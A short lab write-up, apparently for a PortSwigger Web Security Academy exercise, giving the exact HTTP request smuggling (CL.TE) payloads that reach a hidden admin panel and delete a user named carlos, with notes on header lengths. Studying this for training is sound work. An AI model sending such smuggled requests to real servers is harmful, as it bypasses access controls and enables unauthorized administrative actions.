# [Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)

> delete the **carlos** user with the CL.TE vulnerability already know

- you will need 4 request in 2 steps

## first step -> get to the admin page

> first request:

```
POST / HTTP/1.1
Host: 0a370070035f606a812d1189001700d8.web-security-academy.net
Content-Length: 66
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 3

x=
```

- the backend will chop off the `GET /admin ...` because of the `Transfer-Encoding: chunked`
- the `GET /admin ...` part will be appended to the next request
- the `Host` needs to be set to `localhost` because the admin only available from there (since the request is already in)
- `Content-Length` is set to `3` because the `x=` is `2` bytes but need to append the next request to it as well that is why it is `3`
- no `\r\n` after the `x=`

> second request:

```
POST / HTTP/1.1
Host: xxx.web-security-academy.net
Content-Length: 10

duck=quack
```

- this will let you in the admin page where the users can be found

## second step -> delete carlos

> first request:

- from the first step copy the carlos delete link and add it to the `GET`

```
POST / HTTP/1.1
Host: 0a370070035f606a812d1189001700d8.web-security-academy.net
Content-Length: 89
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 3

x=
```

> second request:

```
POST / HTTP/1.1
Host: xxx.web-security-academy.net
Content-Length: 10

duck=quack
```

- it will response with a `302`
